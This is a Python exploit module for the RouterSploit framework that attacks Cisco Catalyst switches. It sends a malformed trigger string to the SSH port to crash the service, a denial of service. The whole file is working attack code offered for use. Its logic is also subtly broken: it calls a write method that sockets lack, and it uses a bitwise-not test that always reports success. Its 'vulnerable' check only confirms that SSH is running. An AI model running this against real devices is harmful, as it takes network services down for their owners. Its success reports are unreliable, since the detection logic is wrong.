import requests
import paramiko
import re

from routersploit import (
    exploits,
    print_success,
    print_status,
    print_error,
    mute,
    validators,
    http_request,
    random_text,
    ssh_interactive
)

import socket


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Cisco catalyst DoS.
    """
    __info__ = {
        'name': 'Cisco Catalyst SSH Protocol DoS',
        'description': 'Cisco IOS software for catalyst SSH server implemention of SSH contain\n'
                       'a SSH protocol mismatch DoS vulnerability. Attacker can exploit this cause\n'
                       'SSH server down (DoS).',
        'authors': [
            'BlackAngles',
        ],
        'references': [
            'http://www.securityfocus.com/bid/5976/info',
        ],
        'devices': [
            'Cisco IOS Software for Catalyst switch'
        ],
        'id': 'sf-5976-5',
    }

    target = exploits.Option('', 'Target IP address', validators=validators.url)
    ssh_port = exploits.Option(22, 'Target SSH Port', validators=validators.integer)
    vuln = exploits.Option('a%a%a%a%a%a%a%', 'Vulnerable trigger data')
    # TODO: UNITEST - FUNC TEST - CASE 10 -- Exploit Test
    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")
            sockfd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sockfd.connect((self.target, self.ssh_port))
            sockfd.write(self.vuln)
            if ~self.check():
                print_success("Target is vulnerable!")
            else:
                print_error("Target may not in suffer")
        else:
            print_error("Exploit failed. Target seems to be not vulnerable.")

    @mute
    def check(self):
        # TODO: UNITEST - FUNC TEST - CASE 09 -- Check func test
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        target = self.target.replace("http://", "").replace("https://", "")

        try:
            ssh.connect(target, self.ssh_port, timeout=5, username=random_text(8), password=random_text(8))
        except paramiko.AuthenticationException:
            print_status("SSH service on target is up!")
            return True  # target is vulnerable
        except Exception:
            print_status("SSH service on target is down!")
            pass

        return False  # target is not vulnerable
